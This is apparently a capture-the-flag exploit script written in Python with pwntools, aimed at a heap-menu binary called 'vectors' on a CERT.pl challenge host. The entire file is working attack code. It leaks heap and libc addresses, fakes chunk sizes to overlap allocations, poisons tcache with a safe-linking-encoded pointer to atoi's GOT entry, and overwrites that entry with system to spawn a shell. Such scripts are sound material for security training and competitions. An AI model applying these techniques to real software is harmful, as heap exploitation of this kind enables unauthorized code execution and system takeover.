#!/usr/bin/env python3


from pwn import *

exe = context.binary = ELF('vectors', checksec=False)
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]


    # Arch:     amd64-64-little
    # RELRO:    Partial RELRO
    # Stack:    No canary found
    # NX:       NX enabled
    # PIE:      No PIE (0x3ff000)


def get_conn(argv=[], *a, **kw):
	host = args.HOST or 'vectors.ecsc23.hack.cert.pl'
	port = int(args.PORT or 5062)
	if args.GDB:
		return gdb.debug([exe.path] + argv, *a, **kw)
	elif args.REMOTE:
		return remote(host, port)
	else:
		kw.pop('gdbscript')
		return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''
gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
env = {}

io = get_conn(env=env, gdbscript=gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
li = lambda *a, **k: log.info(*a, **k)
ls = lambda *a, **k: log.success(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr


_indexes = list(range(10))

def exit():
	sla(b'=> ', b'0')

def add_vector(size):
	if not _indexes:
		li(f'NO FREE SLOTS')
		exit(1)
	sla(b'=> ', b'1')
	sla(b'Size: ', str(size).encode())
	return _indexes.pop(0)


def rm_vector(idx):
	sla(b'=> ', b'2')
	sla(b'Vector: ', str(idx).encode())
	_indexes.append(idx)
	_indexes.sort()

def set_value(vector, idx, value):
	sla(b'=> ', b'3')
	sla(b'Vector: ', str(vector).encode())
	sla(b'Index: ', str(idx).encode())
	sla(b'Value: ', str(value).encode())


def read_value(vector, idx):
	sla(b'=> ', b'4')
	sla(b'Vector: ', str(vector).encode())
	sla(b'Index: ', str(idx).encode())
	data = rl().decode()
	return int(data[len("value: "):])


def add(vec1, vec2):
	sla(b'=> ', b'5')
	sla(b'Vector 1: ', str(vec1).encode())
	sla(b'Vector 2: ', str(vec2).encode())	


for i in range(2):
	add_vector(0x10)

rm_vector(0)

add_vector(0x10)
heap_leak = read_value(0, 0)
ls(f'heap_leak {heap_leak:#x}')

heap_base = heap_leak << 12
ls(f'heap_base {heap_base:#x}')

rm_vector(0)
rm_vector(1)

for i in range(10):
	add_vector(0x10)

for i in range(9):
	rm_vector(i)

for i in range(7):
	add_vector(0x10)

add_vector(0x10)
add_vector(0x10)

libc_leak = read_value(7, 0)
ls(f'libc_leak {libc_leak:#x}')
libc_base = libc_leak - 0x1f6df0
ls(f'libc_base {libc_base:#x}')

for i in range(7):
	rm_vector(i)

set_value(7, 0x10, 0x150)
rm_vector(7)
rm_vector(8)

# sets fake size
add_vector(0x9)
fake_sizer = add_vector(0x9)
set_value(0, 0x9, 0x91)
after_fake = add_vector(0x9)

for i in range(0x9):
	set_value(after_fake, i, 0x91)

for i in range(0x9):
	set_value(fake_sizer, i, 0x91)


add_vector(0x10)
add_vector(0x10)
add_vector(0x10)

rm_vector(fake_sizer)
rm_vector(add_vector(0x9))
rm_vector(add_vector(0x9))
rm_vector(after_fake)


# fake_sizer overlaps with after_fake

fake_sizer = add_vector(0x10)
target_ptr = 0x404040 # atoi got
set_value(fake_sizer, 0xA, protect_ptr(heap_base + 0x730, target_ptr))

add_vector(0x9) # poisons tcache
atoi = add_vector(0x9)

libc = ELF("./libc.so.6")
libc.address = libc_base
set_value(atoi, 0, libc.symbols.system)
sla(b'=> ', b'/bin/sh\x00')

ia()


# max 10 vectorow [0; 9]
# vec size to max 0x10


